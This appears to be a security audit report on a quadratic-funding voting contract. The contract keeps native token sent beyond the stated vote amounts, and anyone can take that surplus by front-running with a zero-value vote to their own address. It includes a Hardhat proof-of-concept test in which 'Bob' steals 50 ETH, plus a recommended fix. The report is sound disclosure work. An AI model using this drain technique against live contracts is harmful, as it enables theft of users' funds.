# User votes with more Native Token than specified in calldata may lead to funding loss

## Summary
If user votes on project with more Native Token than specified, the extra token remains in vote contract might be stolen by malicious user.
## Vulnerability Detail
In _**QuadraticFundingVotingStrategyImplementation**_, user can call _**vote(bytes[] calldata, address)**_ method from _**RoundImplementation**_ to vote on projects with Native Token or ERC20 Token. 

The voting token will be in turn sent to _**_grantAddress**_ specified in calldata, transferred amount is also specified in calldata as _**_amount**_ .

This works fine for ERC20 Token, but for Native Token, protocol does not check if the total token amount user wants to send equals _**msg.value**_, it's possible that user sends more token than required, meaning _**msg.value**_ > total _**_amount**_. In that case, the total _**_amount**_ of Native Token will be sent to _**_grantAddress**_ and the remainings are kept in _**QuadraticFundingVotingStrategyImplementation**_ contract. 

To withdraw, user can simply call _**vote(bytes[] calldata, address)**_ again with the _**_grantAddress**_ being his/her own account. The problem is, an attacker can do the same and front-run user's transaction, to steal the funds.

Let's assume:
1. Alice wants to vote on a project with 100 ETH, but by mistake she uses _{ value: 150 ETH }_ in transaction;
2. 100 ETH is sent to grant address and 50 ETH remains in vote contract;
3. Later Alice reliazes it and she wants to get the funds back, so she submits another vote transaction with _{ value: 0 }_ and __grantAddress_ being her own account;
4. Bob sees Alice's transaction in mempool, so he submits a vote transaction as well and front-run Alice's, with _{ value: 0 }_ and __grantAddress_ being Bob's own account;
5. The 50 ETH in vote contract is sent to Bob's account and Alice gets nothing, the funds was stolen by Bob.

Please see blew Test Codes:

```typescript
describe("audit: vote", () => {
      // let encodedVotes;
      let _currentBlockTimestamp: number;

      beforeEach(async () => {
        _currentBlockTimestamp = (
          await ethers.provider.getBlock(await ethers.provider.getBlockNumber())
        ).timestamp;

        await initRound(_currentBlockTimestamp);

        // Mine Blocks
        await ethers.provider.send("evm_mine", [_currentBlockTimestamp + 900]);
      });

      it("Vote with native token", async () => {
        const [_, alice, bob] = await ethers.getSigners();

        let beforeVoteAliceBalance = await ethers.provider.getBalance(alice.address);
        let beforeVoteBobBalance = await ethers.provider.getBalance(bob.address);
        expect(beforeVoteAliceBalance).to.equal(ethers.utils.parseEther("10000"));
        expect(beforeVoteBobBalance).to.equal(ethers.utils.parseEther("10000"));

        let votingStrategy = await roundImplementation.votingStrategy();
        let beforeVoteVotingStrategyBalance = await ethers.provider.getBalance(votingStrategy);
        expect(beforeVoteVotingStrategyBalance).to.equal("0");

        let grant = Wallet.createRandom().address;
        let beforeVoteGrantBalance = await ethers.provider.getBalance(grant);
        expect(beforeVoteGrantBalance).to.equal(ethers.utils.parseEther("0"));

        // Alice votes 100 ETH on project, but with msg.value being 150 ETH
        let encodedVotes = [];
        const vote = [
          AddressZero,
          ethers.utils.parseUnits("100", "ether"),
          grant,
          formatBytes32String("grant")
        ];
        encodedVotes.push(
          ethers.utils.defaultAbiCoder.encode(
            ["address", "uint256", "address", "bytes32"],
            vote
          )
        );
        await roundImplementation.connect(alice).vote(encodedVotes, { value: ethers.utils.parseUnits("150", "ether") });

        // 100 ETH is sent to project address, 50 ETH remains in vote contract
        let afterVoteGrantBalance = await ethers.provider.getBalance(grant);
        expect(afterVoteGrantBalance).to.equal(ethers.utils.parseEther("100"));

        let afterVoteVotingStrategyBalance = await ethers.provider.getBalance(votingStrategy);
        expect(afterVoteVotingStrategyBalance).to.equal(ethers.utils.parseEther("50"));

        // Bob submits vote transaction to steal 50 ETH from vote contract
        let bobEncodedVotes = [];
        const bobVote = [
          AddressZero,
          ethers.utils.parseUnits("50", "ether"),
          bob.address,
          formatBytes32String("bob")
        ];
        bobEncodedVotes.push(
          ethers.utils.defaultAbiCoder.encode(
            ["address", "uint256", "address", "bytes32"],
            bobVote
          )
        );
        await roundImplementation.connect(bob).vote(bobEncodedVotes, { value: 0 });

        // 50 ETH is sent to Bob and Alice gets nothing
        let afterBobVoteVotingStrategyBalance = await ethers.provider.getBalance(votingStrategy);
        expect(afterBobVoteVotingStrategyBalance).to.equal(0);

        let afterBobVoteBobBalance = await ethers.provider.getBalance(bob.address);
        expect(afterBobVoteBobBalance.gt(beforeVoteBobBalance)).to.be.true;

        let afterBobVoteAliceBalance = await ethers.provider.getBalance(alice.address);
        expect(afterBobVoteAliceBalance.lt(ethers.utils.parseUnits("9850", "ether"))).to.be.true;
      });
    });
```

## Impact
User's voting funds could be stolen by malicious user.

## Tool used

Manual Review

## Recommendation
Please consider check if user sends the same amount of Native Token as the total amount specified in calldata, and revert or send back extra token if it's not the case.
